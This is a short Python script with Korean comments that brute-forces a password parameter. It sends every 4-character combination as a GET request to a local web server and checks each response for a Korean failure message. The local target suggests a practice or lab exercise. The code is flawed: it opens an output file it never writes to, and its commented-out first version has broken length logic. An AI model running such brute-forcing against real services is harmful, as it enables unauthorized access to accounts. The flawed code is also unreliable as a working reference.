# import requests

# # 사용할 문자셋
# chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# # 공격 대상 URL
# url = 'http://localhost:8000/'

# # 비밀번호 추측
# passwd = ''
# for i in range(8,9):  # 비밀번호 길이를 8로 가정
#     for char in chars:
#         test_password = passwd + char + ('_' * (7 - i))
#         url = f'http://localhost:8000/?pw={test_password}'
#         print(test_password)
#         response = requests.get(url)

#         # "흠 틀렸다고 할 수 있지"가 아닌 다른 응답이 오면 비밀번호가 맞음
#         if '흠 틀렸다고 할 수 있지' not in response.text:
#             passwd += char
#             print(f"현재 비밀번호: {passwd}")
#             break

from itertools import product
import requests

chars = input('[*] Input : brute force dictionary chars >> ')	# 조합할 문자들 입력
f = open('brute_force.txt','w')
for length in range(4,5):	# 만들고 싶은 사전의 자릿수. 5자리 -> range(5,6)
	to_attempt = product(chars, repeat=length)
	for attempt in to_attempt:
		brute = ''.join(attempt)
		url = f'http://localhost:8000/?pw={brute}'
		response = requests.get(url)
		print(brute)
		if '흠 틀렸다고 할 수 있지' not in response.text:
			print(f"현재 비밀번호: {brute}")
			break

f.close()

#print("비밀번호 찾음: " + passwd)
